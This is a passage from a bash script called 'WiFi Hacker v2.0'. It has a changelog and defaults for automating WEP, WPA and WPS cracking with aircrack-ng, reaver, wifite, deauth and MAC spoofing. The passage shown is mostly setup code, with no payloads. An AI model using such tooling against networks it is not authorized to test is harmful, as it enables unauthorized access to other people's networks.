Added a manual interface name override option to \"getWirelessInterfaces\" function. Set manually to wlan0, wlan1, wlan2, etc. This will automatically display during normal execution and you may ignore it for defaults.\n# - Added a \"refresh\" flag that is set to hide override text on subsequent calls to \"getWirelessInterfaces\" function.\n# - Added \"bannerSlim\" function to use a \"Title Only\" banner for disclaimer and unreleased menus.\n# - Updated text for gathering target info on all the different encryption types.\n# - Updated sleep messages for WPS attacks.\n# - Fixed PixieDust option not setting correctly if nothing is selected at menu choice.\n# - Updated text for all banners. Changed the main title text and domain name.\n# - Fixed all the killProcess functions to now kill the process until it no longer shows up under process list.\n# - Added a force exit for aircrack-ng before cracking attempt. This attempts to fix the corrupt errors when scanning IVS and CAP files.\n# - Fixed previous Airodump and Aireplay windows not closing when launching a new dump session for WEP Attack Menu.\n# - Added \"findCaptureFiles\" function to list all available cap, ivs, csv, netxml files for cracking.\n# - Added terminal colors to a \"setTerminalColors\" function.\n# - Added \"checkUpdate\" and \"getUpdate\" functions to grab the newest shell script directly.\n# - Updated text on stats banner. Changed \"Interface Name: \" to \"Interface: \" to allow for longer ESSID names without flooding to the next line.\n\n# v1.3\n# - Added support for AirCrack Suite v1.2+ using the new wlanXmon format instead of monX.\n# - Fixed \"wlanXmon\" error in Kali Linux 2.x caused by new AirCrack Suite 1.2+. See \"fixKaliTwoMonError\" function for more info.\n# - Added a function to check the Linux version running.\n# - Removed Honeypot Mode from the banners. It has been relocated to the Advanced Menu.\n# - Added \"$interfaceName\" and \"$interfaceMode\" variables.\n# - Added interfaceName to the stats banner. This will display the current interface name (wlan0, mon0, wlan0mon, etc).\n# - Added interfaceMode to the main banner. Valid Interface Modes are 0=Managed / 1=Monitor Standard / 2=Monitor New / 3=Monitor Other / 4=Unknown\n# - Added \"Open Interface Options\" item to Extras Menu.\n# - Added \"Interface Up\", \"Interface Down\", \"Interface Managed\", and \"Interface Monitor\" to Extras Menu. The Up and Down functions affect the interface ONLY for monitor mode (mon0, mon1, wlan0mon, wlan1mon, etc) currently. Please use Enable/Disable Channel Hopping to bring up/down a managed interface (i.e. wlan0, wlan1, etc).\n# - Added support for all new Reaver arguments and options for Kali 2.x build.\n# - Added airodump-ng WPS scanning options to now show WPS connections without using wifite to show them.\n# - Removed the wifite window from being launched with standard WPS attack. Replaced by --wps flag in airodump-ng.\n# - Added \"fixAirmonCompat\" function to send the command to kill any processes that may interfere.\n# - Removed the \"initAirmon\" function that was inactive.\n# - Added the airmon-ng conflicting process fix to Extras Menu.\n# - Added \"wlanXmon\" interfaces for monitor mode termination. A better way of doing this will be done soon!\n# - Fixed not returning to Extras Menu from \"Open Interfaces Menu\".\n# - Added \"isDebugMode\" variable to show/hide certain areas that may need additional testing output. Disabled by default.\n# - Fixed default WEP dump scanning channel hopping during attack.\n\n# v1.2\n# - Fixed the top text of disclaimer banner from being cut off.\n\n# v1.1\n# - Now globally enforcing disconnection from any active network upon agreement of disclaimer to resolve \"Channel Hopping\" issues. This must be done for all attacks to work properly.\n# - Added \"HoneyPot Mode\" to main toolbar. The hotkey is \"Z\" to launch from anywhere in script. There is currently support for airbase-ng and wifi-honey.\n# - Fixed \"Negative One Channel Error\" occuring in airodump-ng on Kali Linux 1.0.6 and higher. This is fixed globally and should work on all platforms.\n# - Added \"Start NetworkManager\", \"Stop NetworkManager\", \"Stop wpa_supplicant\", \"Stop wpa_cli\", \"Enable Channel Hopping\", and \"Disable Channel Hopping\" to Extras menu.\n# - Enabled the Advanced Menu. Also enabled the hotkey \"A\" to launch it. Future releases will contain highly configurable settings for supported apps and modules.\n# - Added support for nmap and netcat, for use during post exploitation.\n# - Fixed some $bssid and $essid variable errors in WEP attacks. \n# - Fixed airodump window not closing if using load session hotkey during victim info, and then returning to the post monitor mode menu.\n# - Fixed a bug where the post monitor mode screen would still load if no encryption type was selected. If the encryption type is empty, it will now return to the main menu.\n# - Updated on-screen instructions for using the airdump windows and other terminal windows that are opened during target/victim setup.\n# - Fixed network connection not refreshing the correct status when returning to the main menu if the network status has changed while still on the menu.\n# - Added a second check to verify that no active network connection is present before launching an attack.\n# - Moved autoMode text towards the top of the post monitor mode initiation screen to be more easily visible to the user.\n# - Added support for post-exploitation attacks after a target has been compromised.\n# - Added support for \"wifite\". This is used for some of the newer automated attack modes as well as an alternate option to aircrack-suite if desired.\n# - Added Auto Attack Mode to the main menu. This option uses wifite to scan and attack any vulnerable network.\n# - Changed some text around on some items to be more clear and understandable.\n# - Added Auto modes for each attack type when selected. Once an encryption type is selected, you can type \"autowep, autowps, autowpa, and autowpa2 respectively to automate the attack.\n# - Fixed a few $lastMenuID variables not properly set for menu navigation.\n# - Added a wifite window alongside the aircrack window when selecting WPS attacks, to help decipher which targets support WPS more easily.\n\n# v1.0\n# - Activated the disclaimer when launching the script to make sure everyone knows the rules ;)\n# - Added \"checkRootStatus\" to verify elevated privileges before launching main menu.\n# - Fixed a few typos throughout the script.\n# - Added Connection display to main menu. A status of \"0\" is disconnected and \"1\" is connected.\n# - Added connection status check before allowing an attack mode to be selected. This prevents trying to start an attack and being locked into a channel and other abnormalities.\n# - Added text display variables for connection status. They can be displayed as \"None\" or \"Wifi\", depending on if connection status is 0 or 1.\n\n# v0.9\n# - Removed the writeDCrackPy() function. This was used to write the Python script dcrack.py out to a file.\n\n# v0.8\n# - Added support for besside-ng. Used for cracking WPA/WPA2 passwords,and upload to cloud cracking,\n# - Fixed the aircrack window from closing after running dictionary attack.\n# - Added checkDependencies() function to check for all required files before loading main menu.\n# - Fixed the Navigation Bar from not showing up on the Help menu.\n# - Fixed the aircrack window from not closing when restarting WPA/WPA2 attacks.\n# - Fixed Help and Advanced menus not returning to the last page when trying to go back.\n\n# v0.7\n# - Fixed WEP aircrack errors with ESSID names that have spaces in them.\n# - Fixed Terminal Options not returning to previous menu properly.\n# - Cleaned up some old code that is no longer being used or referenced.\n# - Fixed reaver WPC files not getting copied correctly.\n# - Now copies all WPC files during reaver startup, and overwrites current WPC file after reaver session ends.\n\n# v0.6\n# - Added time and date stamp to all $encryptionType.sessions log files.\n# - The \"Clean Capture Files\" option now only removes files in the init directory, not sessions directory.\n# - Fixed bug not returning back to Extras menu after selected task has been completed.\n# - All created files will now be saved to the \"/sessions/$encryptionType\" directory by default.\n# - Added getCurrentDate() and getCurrentTime() functions to use with sessions and backups.\n# - Added Backup options to Extras menu. This creates a zip file with all saved sessions and capture files.\n# - Added \"*.kismit.csv\" and \"*.kismit.netxml\" files to \"Cleanup Capture Files\" menu under Extras.\n# - Changed all references from $currentTask to $lastMenuID because of menu navigation issues.\n# - Added a new variable called $lastMenuID for (hopefully) proper navigation between menus.\n# - Moved code for checking MAC Spoof Status into a checkSpoofStatus() function. Can now be used globally.\n# - Fixed a typo in Load Session function.\n# - Updated sessions save folder and organized by encryption type.\n# - Added saving reaver session WPC files to default sessions folder.\n\n# v0.5\n# - Fixed WEP attack. It wasn't being properly redirected after the last v0.4 update.\n# - All attack modes re-tested and seem to be working fine.\n# - Added a check for empty encryption type to prevent doing certain tasks if no type has yet been selected.\n# - Updated Save and Load session menu. It does not work properly from some menus. Still in testing.\n\n# v0.4\n# - Moved all initialization functions and variables to initMain(). This is only for \"code cleanliness\".\n# - Updated aircrack and airodump redirection based on the encryption type of the attack.\n# - Added \"Clean Session Files\" to Extras menu. Be careful with this and be sure to keep backups.\n# - Fixed not being able to return to attacks menu from Save and Load session for WEP attacks.\n# - Added a $currentTask variable to change dynamically depending on what function is being executed.\n# - Moved aircrack windows for WPA and WPA2 attacks to external terminal windows.\n# - Fixed not being able to leave aircrack window while running WPA and WPA2 attacks.\n\n# v0.3\n# - Updated WPA and WPA2 attack modes. Both are fully working and can load custom wordlists.\n# - Added the ability to change terminals under Extras menu. Supports Gnome, Konsole, Xterm, and Custom.\n# - Fixed blank session files being written when no encryption type has yet been selected.\n# - Added a disclaimer that must be accepted before launching main menu (currently disabled).\n# - Fixed both WPA and WPA2 from not writing proper values to \"$capturePath/$encryptionType/$encryptionType.sessions\" log file.\n# - Fixed a bug in WPA/WPA2 that prevented returning to main menu or exiting from wordlist page.\n# - Updated some on-screen text when deauth station is running for WEP, WPA, and WPA2.\n# - Removed Auto mode from top banner, its now defaulted after choosing encryption type.\n\n# v0.2\n# - Fixed WEP and WPS (reaver) attacks. Both are fully working now!\n# - Each attack type writes to its own log file now (\"$capturePath/$encryptionType/$encryptionType.sessions\").\n# - Cleaned up some old migrated code from previous scripts.\n\n# v0.1\n# - Initial version. Combined other current wifi scripts into one.\n\n\n############################################################################\n#   VERSION HISTORY END   ##################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   TO DO LIST BEGIN   #####################################################\n############################################################################\n\n\n# Extend the width of the airodump windows when opening externally\n# Add change options on-the-fly for WPS and other attack modes\n# Add cowpatty support for WPA/WPA2 attacks\n# Set an \"ok so far\" temp variable to see if all dependencies are available\n# Set default $serverWPA veriable to some value other than blank\n# Add sniffing/wireshark support\n# Add support for airbase-ng\n# Create separate handshake file with an appropriate filename\n# Add \"create wordlist\" for phone numbers and possibly others. Add option for local\n# Add checks and copy files created by besside to appropriate directories\n# Add convert to .hccap support for ocl-hashcat and other compatible software\n# Get advanced mode working\n# Get help menu working\n\n\n# Post-Exploitation Attacks To Add (Probably Scrap 20160514)\n\n# driftnet\n# nmap\n# wifi-honey\n\n\n############################################################################\n#   TO DO LIST END   #######################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   INITIALIZATION OPTIONS BEGIN   #########################################\n############################################################################\n\n\ninitMain(){\n\n\t#checkArgs\n\n\tcheckLinuxVersion\n\n\tkillAll\n\t#startNetworkManager\n\n\tgetCurrentDate\n\tgetCurrentTime\n\tgetCurrentDateAndTime\n\n\tsetDependencies\n\tcheckDependencies\n\n\tresizeWindow\n\n\tsetVariablesRequired\n\tsetVariablesOptional\n\tsetVariablesAdvanced\n\n\tsetDefaults\n\tsetDefaultsWEP\n\tsetDefaultsWPA\n\tsetDefaultsWPA2\n\tsetDefaultsWPS\n\n\tsetDefaultSession\n\n\tsetTerminalColors\n\n\t# Optionally show dependencies before launch\n\t#showDependencies\n\n\t# Optionally Show Disclaimer Before Launch\n\tshowDisclaimer\n\n\t# Optionally Show Unreleased Text Before Launch\n\t#isUnreleased\n\n\t# Load Main Menu\n\tmenuMain\n\n}\n\ncheckArgs(){\n\n\tcase \"$#\" in\n\t\n\t\"1\")\n\tif [ -e $1 ];\n\t\tthen\n\t\t\techo \"File $1 Exists\"\n\t\telse\n\t\t\techo \"File $1 Does Not Exist\"\n\tfi\n\t;;\n\t\n\tesac\n}\n\ncheckLinuxVersion(){\n\n\t# Set both default Kali values to ON and if blank, Kali is not present\n\tisKali=1\n\tisKaliTwo=1\n\n\t# Get Linux Build Info\n\tlinuxVersion=$(lsb_release -a | grep Description | cut -f2 -d\":\")\n\n\t# Check against the Linux Version for the presence of Kali\n\tkali=$(echo \"$linuxVersion\" | grep Kali)\n\n\t# Check against the Linux Version for the presence of Kali 2.x\n\tkaliTwo=$(echo \"$linuxVersion\" | grep Kali | grep 2.)\n\n\t# Check For Kali Linux\n\tcase \"$kali\" in\n\n\t\t\"\")\n\t\tisKali=0\n\t\t;;\n\tesac\n\n\t# Check For Kali Linux 2.x\n\t# Uses Aircrack-ng v1.2 RC2+ (Monitor Mode Is Different)\n\tcase \"$kaliTwo\" in\n\n\t\t\"\")\n\t\tisKaliTwo=0\n\t\t;;\n\tesac\n\n\t#echo \"Linux Version: $linuxVersion\"\n\t#echo \"\"\n\t#echo \"Is Kali?: $isKali\"\n\t#echo \"\"\n\t#echo \"Is Kali 2.x?: $isKaliTwo\"\n\t#read pause\n}\n\n\n############################################################################\n#   INITIALIZATION OPTIONS END   ###########################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   DEPENDENCY OPTIONS BEGIN   #############################################\n############################################################################\n\n\nsetDependencies(){\n\n\tpathAircrack=\"/usr/bin/aircrack-ng\"\n\tpathAireplay=\"/usr/sbin/aireplay-ng\"\n\tpathAirodump=\"/usr/sbin/airodump-ng\"\n\tpathBesside=\"/usr/sbin/besside-ng\"\n\tpathCut=\"/usr/bin/cut\"\n\tpathDate=\"/bin/date\"\n\tpathGrep=\"/bin/grep\"\n\tpathHead=\"/usr/bin/head\"\n\tpathLink=\"/usr/bin/link\"\n\tpathMacchanger=\"/usr/bin/macchanger\"\n\tpathMkdir=\"/bin/mkdir\"\n\tpathPacketforge=\"/usr/sbin/packetforge-ng\"\n\tpathReaver=\"/usr/bin/reaver\"\n\tpathRmdir=\"/bin/rmdir\"\n\tpathSed=\"/bin/sed\"\n\tpathSleep=\"/bin/sleep\"\n\tpathTail=\"/usr/bin/tail\"\n\tpathWash=\"/usr/bin/wash\"\n\tpathWget=\"/usr/bin/wget\"\n\n}\n\n\ncheckDependencies(){\n\n\t#tempCounter=0\n\t#numberOfDependencies=0\n\t\n\t#tempPath=\"\"\n\t#tempStatus=\"\"\n\n\t# If counter is less than max dependencies, then build statuses\n\t#if [ $tempCounter -lt $numberOfDependencies ];\n\t#\tthen\n\t#\t\t# Set Path Name\n\t#\t\tif [ -f $tempPath ];\n\t#\t\t\tthen\n\t#\t\t\t\t# Set Status As Available\n\t#\t\t\t\t$tempStatus=\"OK\"\n\t#\t\t\telse\n\t#\t\t\t\t# Set Status As Unavailable\n\t#\t\t\t\t$tempStatus=\"NA\"\n\t#\t\tfi\n\t#\telse\n\t#\t\t#echo \"Done With Dependencies\"\n\t#\t\t#read pause\n\t#fi\n\t\n\tif [ -f $pathAircrack ];\n\t\tthen\n\t\t   statusPathAircrack=\"OK\"\n\t\telse\n\t\t   statusPathAircrack=\"NA\"\n\tfi\n\n\tif [ -f $pathAirodump ];\n\t\tthen\n\t\t   statusPathAirodump=\"OK\"\n\t\telse\n\t\t   statusPathAirodump=\"NA\"\n\tfi\n\n\tif [ -f $pathAireplay ];\n\t\tthen\n\t\t   statusPathAireplay=\"OK\"\n\t\telse\n\t\t   statusPathAireplay=\"NA\"\n\tfi\n\n\tif [ -f $pathBesside ];\n\t\tthen\n\t\t   statusPathBesside=\"OK\"\n\t\telse\n\t\t   statusPathBesside=\"NA\"\n\tfi\n\n\tif [ -f $pathCut ];\n\t\tthen\n\t\t   statusPathCut=\"OK\"\n\t\telse\n\t\t   statusPathCut=\"NA\"\n\tfi\n\n\tif [ -f $pathDate ];\n\t\tthen\n\t\t   statusPathDate=\"OK\"\n\t\telse\n\t\t   statusPathDate=\"NA\"\n\tfi\n\n\tif [ -f $pathGrep ];\n\t\tthen\n\t\t   statusPathGrep=\"OK\"\n\t\telse\n\t\t   statusPathGrep=\"NA\"\n\tfi\n\n\tif [ -f $pathHead ];\n\t\tthen\n\t\t   statusPathHead=\"OK\"\n\t\telse\n\t\t   statusPathHead=\"NA\"\n\tfi\n\n\tif [ -f $pathLink ];\n\t\tthen\n\t\t   statusPathLink=\"OK\"\n\t\telse\n\t\t   statusPathLink=\"NA\"\n\tfi\n\n\tif [ -f $pathMacchanger ];\n\t\tthen\n\t\t   statusPathMacchanger=\"OK\"\n\t\telse\n\t\t   statusPathMacchanger=\"NA\"\n\tfi\n\n\tif [ -f $pathMkdir ];\n\t\tthen\n\t\t   statusPathMkdir=\"OK\"\n\t\telse\n\t\t   statusPathMkdir=\"NA\"\n\tfi\n\n\tif [ -f $pathPacketforge ];\n\t\tthen\n\t\t   statusPathPacketforge=\"OK\"\n\t\telse\n\t\t   statusPathPacketforge=\"NA\"\n\tfi\n\n\tif [ -f $pathReaver ];\n\t\tthen\n\t\t   statusPathReaver=\"OK\"\n\t\telse\n\t\t   statusPathReaver=\"NA\"\n\tfi\n\n\tif [ -f $pathRmdir ];\n\t\tthen\n\t\t   statusPathRmdir=\"OK\"\n\t\telse\n\t\t   statusPathRmdir=\"NA\"\n\tfi\n\n\tif [ -f $pathSed ];\n\t\tthen\n\t\t   statusPathSed=\"OK\"\n\t\telse\n\t\t   statusPathSed=\"NA\"\n\tfi\n\n\tif [ -f $pathSleep ];\n\t\tthen\n\t\t   statusPathSleep=\"OK\"\n\t\telse\n\t\t   statusPathSleep=\"NA\"\n\tfi\n\n\tif [ -f $pathTail ];\n\t\tthen\n\t\t   statusPathTail=\"OK\"\n\t\telse\n\t\t   statusPathTail=\"NA\"\n\tfi\n\n\tif [ -f $pathWash ];\n\t\tthen\n\t\t   statusPathWash=\"OK\"\n\t\telse\n\t\t   statusPathWash=\"NA\"\n\tfi\n\n\tif [ -f $pathWget ];\n\t\tthen\n\t\t   statusPathWget=\"OK\"\n\t\telse\n\t\t   statusPathWget=\"NA\"\n\tfi\n\n}\n\n\ndownloadDependencies(){\n\n\tblank=\"\"\n\n}\n\n\nshowDependencies(){\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"List of File Dependencies Needed\"\n\techo \"\"\n\techo \"$pathAircrack - Status: $statusPathAircrack\"\n\techo \"$pathAireplay - Status: $statusPathAireplay\"\n\techo \"$pathAirodump - Status: $statusPathAirodump\"\n\techo \"$pathBesside - Status: $statusPathBesside\"\n\techo \"$pathCut - Status: $statusPathCut\"\n\techo \"$pathDate - Status: $statusPathDate\"\n\techo \"$pathGrep - Status: $statusPathGrep\"\n\techo \"$pathHead - Status: $statusPathHead\"\n\techo \"$pathLink - Status: $statusPathLink\"\n\techo \"$pathMacchanger - Status: $statusPathMacchanger\"\n\techo \"$pathMkdir - Status: $statusPathMkdir\"\n\techo \"$pathPacketforge - Status: $statusPathPacketforge\"\n\techo \"$pathReaver - Status: $statusPathReaver\"\n\techo \"$pathRmdir - Status: $statusPathRmdir\"\n\techo \"$pathSed - Status: $statusPathSed\"\n\techo \"$pathSleep - Status: $statusPathSleep\"\n\techo \"$pathTail - Status: $statusPathTail\"\n\techo \"$pathWash - Status: $statusPathWash\"\n\techo \"$pathWget - Status: $statusPathWget\"\n\techo \"\"\n\techo \"\"\n\n\techo \"Press ENTER to continue....\"\n\n\tread pause\n\n}\n\n\n############################################################################\n#   DEPENDENCY OPTIONS END   ###############################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   TERMINAL OPTIONS BEGIN   ###############################################\n############################################################################\n\n\nsetWindowTitle(){\n\n\tcurrentTask=\"setWindowTitle\"\n\n\ttitle='echo -ne \"\\033]0;WiFi Hacker v2.0\\007\"'\n\n\t$title\n\n}\n\n\nresizeWindow(){\n\n\tcurrentTask=\"resizeWindow\"\n\n\tprintf '\\033[8;32;115t'\n\n}\n\n\nsetTerminalColors(){\n\n\tcurrentTask=\"setTerminalColors\"\n\n\t# Foreground Colors\n\tdefaultFG=$(echo 'printf' '\\033[39m')\n\t\n\tblack=$(echo 'printf' '\\033[30m')\n\tblue=$(echo 'printf' '\\033[34m')\n\tcyan=$(echo 'printf' '\\033[36m')\n\tdarkGrey=$(echo 'printf' '\\033[90m')\n\tgreen=$(echo 'printf' '\\033[32m')\n\tlightBlue=$(echo 'printf' '\\033[94m')\n\tlightCyan=$(echo 'printf' '\\033[96m')\n\tlightGreen=$(echo 'printf' '\\033[92m')\n\tlightGrey=$(echo 'printf' '\\033[37m')\n\tlightMagenta=$(echo 'printf' '\\033[95m')\n\tlightRed=$(echo 'printf' '\\033[91m')\n\tlightYellow=$(echo 'printf' '\\033[93m')\n\tmagenta=$(echo 'printf' '\\033[35m')\n\tred=$(echo 'printf' '\\033[31m')\n\twhite=$(echo 'printf' '\\033[0m')\n\twhiteAlt=$(echo 'printf' '\\033[97m')\n\tyellow=$(echo 'printf' '\\033[33m')\n\t\n\t# Background Colors\n\tdefaultBG=$(echo 'printf' '\\033[49m')\n\t\n\tblackBG=$(echo 'printf' '\\033[40m')\n\tblueBG=$(echo 'printf' '\\033[44m')\n\tcyanBG=$(echo 'printf' '\\033[46m')\n\tdarkGreyBG=$(echo 'printf' '\\033[100m')\n\tgreenBG=$(echo 'printf' '\\033[42m')\n\tlightBlueBG=$(echo 'printf' '\\033[104m')\n\tlightCyanBG=$(echo 'printf' '\\033[106m')\n\tlightGreenBG=$(echo 'printf' '\\033[102m')\n\tlightGreyBG=$(echo 'printf' '\\033[47m')\n\tlightMagentaBG=$(echo 'printf' '\\033[105m')\n\tlightRedBG=$(echo 'printf' '\\033[101m')\n\tlightYellowBG=$(echo 'printf' '\\033[103m')\n\tmagentaBG=$(echo 'printf' '\\033[45m')\n\tredBG=$(echo 'printf' '\\033[41m')\n\twhiteBG=$(echo 'printf' '\\033[107m')\n\tyellowBG=$(echo 'printf' '\\033[43m')\n\n}\n\n\nsetTerminalTextEffects(){\n\n\tcurrentTask=\"setTerminalTextEffects\"\n\n\ttextBlink=$(echo -e \"\\e[5m\")\n\ttextBold=$(echo -e \"\\e[1m\")\n\ttextDim=$(echo -e \"\\e[2m\")\n\ttextHidden=$(echo -e \"\\e[8m\")\n\ttextInverted=$(echo -e \"\\e[7m\")\n\ttextUnderline=$(echo -e \"\\e[4m\")\n\n}\n\n\n############################################################################\n#   TERMINAL OPTIONS END   #################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   DEFAULT VARIABLES BEGIN   ##############################################\n############################################################################\n\n\nsetVariablesRequired(){\n\n\tcurrentTask=\"setVariablesRequired\"\n\n\tversionBase=\"2.0\"\n\tversionBaseClean=\"00\"\n\n\tinitPath=\"$PWD\"\n\n\tisDebugMode=\"0\"\n\tisDevBuild=\"0\"\n\n\t# Update Stuff\n\tversionRemote=\"0.0\"\n\tversionRemoteClean=\"00\"\n\tversionRemoteTemp=\"0.0\"\n\tnewUpdateAvailable=\"0\"\n\tupdateMaster=https://raw.githubusercontent.com/esc0rtd3w/wifi-hacker/master/wifi-hacker.sh\n\tupdateTemp=\"/tmp/update-check.tmp\"\n\tupdateChecked=\"0\"\n\tskipUpdate=\"0\"\n\treturnToUpdatePage=\"0\"\n\n\t# Setting default update downloaded script value\n\tnewVersionScript=\"0.0\"\n\t\n\t# Check Gnome version for terminal options (added 20190205)\n\tgnomeVer=$(gnome-terminal --version | grep \"3.\")\n\n\tcase \"$gnomeVer\" in\n\t\n\t\t# Kali 2018.4 GNOME Terminal 3.30.0 using VTE 0.54.1 +GNUTLS\n\t\t\"\")\n\t\tgnomeOptions=\"legacy\"\n\t\tterminal=\"gnome-terminal -x\"\n\t\tterminalGnome=\"gnome-terminal -x\"\n\t\tterminalGnomeLegacy=\"gnome-terminal -x\"\n\t\t;;\n\n\t\t*)\n\t\tgnomeOptions=\"new\"\n\t\tterminal=\"gnome-terminal --window --geometry=132x24 --\"\n\t\tterminalGnome=\"gnome-terminal --window --geometry=132x24 --\"\n\t\tterminalGnomeLegacy=\"gnome-terminal -x\"\n\t\t;;\n\n\tesac\n\n\t#echo \"gnomeOptions: $gnomeOptions\"\n\t#read pause\n\n\tterminalKonsole=\"konsole -e\"\n\tterminalXterm=\"xterm -e\"\n\n\tbin=\"\"\n\t\n}\n\n\nsetVariablesOptional(){\n\n\tcurrentTask=\"setVariablesOptional\"\n\n\tblank=\"\"\n\n}\n\n\nsetVariablesAdvanced(){\n\n\tcurrentTask=\"setVariablesAdvanced\"\n\n\tblank=\"\"\n\n}\n\n\nsetDefaults(){\n\n\tcurrentTask=\"setDefaults\"\n\tstartMonitorMode=\"airmon-ng start\"\n\tstopMonitorMode=\"airmon-ng stop\"\n\n\tgetRandomMacAddress=\"\"\n\tspoofStatus=\"0\"\n\tresetSpoofStatus=\"0\"\n\n\tencryptionType=\"empty\"\n\tencryptionTypeText=\"Empty\"\n\n\tipStatus=\"0\"\n\n\tinterface=\"wlan0\"\n\t#interfaceMonitor=\"mon0\"\n\tinterfaceMonitor=\"wlan0mon\"\n\tinterfaceName=\"wlan0\"\n\tinterfaceMode=\"0\"\n\tinterfaceNumber=\"0\"\n\tinterfaceNumberMax=\"99\"\n\tinterfacesFound=\"0\"\n\tbssid=\"\"\n\tessid=\"\"\n\tchannel=\"\"\n\n\tnoChannel=\"0\"\n\n\t# This is used to return from backupCaptureFiles if invoked from backupCaptureFiles\n\tbackupFromCaptureErase=\"0\"\n\n\t# This is used to return from backupSessionFiles if invoked from backupSessionFiles\n\tbackupFromSessionErase=\"0\"\n\n\t\n\t# Default Attack Methods\n\tattackMethodWEP=\"\"\n\tattackMethodWPS=\"reaver\"\n\tattackMethodWPA=\"\"\n\tattackMethodWPA2=\"\"\n\n\n\t#Find Network Adapter Commands\n\tshowAdapterPciAll=$(lspci | egrep -i 'network|ethernet')\n\tshowAdapterUsbAll=$(lsusb | egrep -i '')\n\tshowAdapterUsbAtheros=$(lsusb | egrep -i 'atheros|0cf3')\n\n\t# Atheros WiFi Adapters\n\tshowAdapterUsbAtherosAR9271=$(lsusb | egrep -i 'AR9271' | cut -d \":\" -f3)\n\n\t# Intel WiFi Adapters\n\tshowAdapterUsbIntel6205=$(lspci | egrep -i 'Intel Corporation Centrino Advanced-N 6205' | cut -d \":\" -f3)\n\n\t# Support For 10 Adapter Names\n\tadapterNameDefault=\"No Adapter Name Available\"\n\tshowAdapterOneName=\"$adapterNameDefault\"\n\tshowAdapterTwoName=\"$adapterNameDefault\"\n\tshowAdapterThreeName=\"$adapterNameDefault\"\n\tshowAdapterFourName=\"$adapterNameDefault\"\n\tshowAdapterFiveName=\"$adapterNameDefault\"\n\tshowAdapterSixName=\"$adapterNameDefault\"\n\tshowAdapterSevenName=\"$adapterNameDefault\"\n\tshowAdapterEightName=\"$adapterNameDefault\"\n\tshowAdapterNineName=\"$adapterNameDefault\"\n\tshowAdapterTenName=\"$adapterNameDefault\"\n\t\n\t# Default Capture Lists Values\n\tlistCap=0\n\tlistIvs=0\n\tlistXor=0\n\tlistCsv=0\n\tlistNetXml=0\n\n\thotkeyInput=\"\"\n\n\tapListType=\"\"\n\n\t# Default Session Values\n\tsessionID=\"0\"\n\n\tcapturePath=$(echo \"$PWD/sessions\")\n\tcapturePathWEP=$(echo \"$PWD/sessions/wep\")\n\tcapturePathWPS=$(echo \"$PWD/sessions/wps\")\n\tcapturePathWPA=$(echo \"$PWD/sessions/wpa\")\n\tcapturePathWPA2=$(echo \"$PWD/sessions/wpa2\")\n\n\t# Default Current Directory Temp Path\n\twhTemp=$(echo \"$PWD/temp\")\n\n\tdefaultScanOutputIVS=\"$initPath/apScan-01.ivs\"\n\tdefaultScanOutputXML=\"$initPath/apScan-01.kismet.netxml\"\n\tdefaultScanOutputTXT=\"$initPath/apScan-01.txt\"\n\n}\n\n\nsetDefaultsWEP(){\n\n\tcurrentTask=\"setDefaultsWEP\"\n\n\t# aircrack-ng cracking mode WEP\n\tacMode=\"1\"\n\n\t# aircrack-ng cracking mode WEP (WPA-PSK)\n\t#acMode=\"2\"\n\n\twashFile=\"$whTemp/wash.txt\"\n\twashChannel=\"1\"\n\n}\n\n\nsetDefaultsWPA(){\n\n\tcurrentTask=\"setDefaultsWPA\"\n\n\twordlist=\"/usr/share/wordlists/metasploit/password.lst\"\n\n\tretryDeauth=\"0\"\n\n\tserverWPA=\"\"\n\n}\n\n\nsetDefaultsWPA2(){\n\n\tcurrentTask=\"setDefaultsWPA2\"\n\n}\n\n\nsetDefaultsWPS(){\n\n\tcurrentTask=\"setDefaultsWPS\"\n\n\treaver=\"reaver\"\n\n\treaverSessionPath=\"etc/reaver\"\n\tbssidCharOnly=\"\"\n\n\treaverInterfaceInput=\"\"\n\treaverBSSIDInput=\"\"\n\n\treaverChannelInput=\"\"\n\treaverESSIDInput=\"\"\n\treaverExecInput=\"\"\n\treaverMACInput=\"\"\n\treaverOutfileInput=\"\"\n\treaverSessionInput=\"\"\n\n\treaverDelayInput=\"\"\n\treaverFailWaitInput=\"\"\n\treaverM57TimeoutInput=\"\"\n\treaverMaxAttemptsInput=\"\"\n\treaverPinInput=\"\"\n\treaverTimeoutInput=\"\"\n\n\treaverDelay=\"--delay=\"\n\treaverDHSmall=\"--dh-small\"\n\treaverEAPTerminate=\"--eap-terminate\"\n\treaverFailWait=\"--fail-wait=\"\n\treaverIgnoreLocks=\"--ignore-locks\"\n\treaverM57Timeout=\"--m57-timeout=\"\n\treaverMaxAttempts=\"--max-attempts=\"\n\treaverNack=\"--nack\"\n\treaverNoAssociate=\"--no-associate\"\n\treaverNoNacks=\"--no-nacks\"\n\treaverPin=\"--pin=\"\n\treaverRecurringDelay=\"--recurring-delay\"\n\treaverTimeout=\"--timeout=\"\n\treaverWin7False=\"--win7\"\n\n\treaver5ghz=\"--5ghz\"\n\treaverAuto=\"--auto\"\n\treaverChannel=\"--channel=\"\n\treaverDaemonize=\"--daemonize\"\n\treaverESSID=\"--essid=\"\n\treaverExec=\"--exec=\"\n\treaverFixed=\"--fixed\"\n\treaverHelp=\"--help\"\n\treaverMAC=\"--mac=\"\n\treaverOutfile=\"--out-file=\"\n\treaverQuiet=\"--quiet\"\n\treaverSession=\"--session=\"\n\treaverVerbose=\"-v\"\n\treaverVerboseMore=\"-vv\"\n\n\t# Updated Options\n\treaverDaemonize=\"-D\"\n\treaverExhaustive=\"-X\"\n\treaverNoAutoPass=\"-Z\"\n\treaverP1Index=\"-1\"\n\treaverP2Index=\"-2\"\n\treaverPixie=\"-K\"\n\treaverPixieLoop=\"-P\"\n\treaverGeneratePin=\"-W\"\n\n\treaverCurrentSessionFile=\"\"\n\n\t# -K Argument Number (Default 1)\n\tpixieNumber=\"1\"\n\n\t# Check to see if Pixie Attack Failed\n\tpixieFailed=\"0\"\n\n\n\twifite=\"wifite\"\n\twifiteAttackAll=\"wifite --all\"\n\twifiteAttackWEP=\"wifite --all --wep\"\n\twifiteAttackWPA=\"wifite --all --wpa\"\n\twifiteAttackWPA2=\"wifite --all --wpa\"\n\twifiteAttackWPS=\"wifite --all --wps\"\n\n\t# Bully Options\n\t#bully <options> interface\n\t\n}\n\n\n############################################################################\n#   DEFAULT VARIABLES END   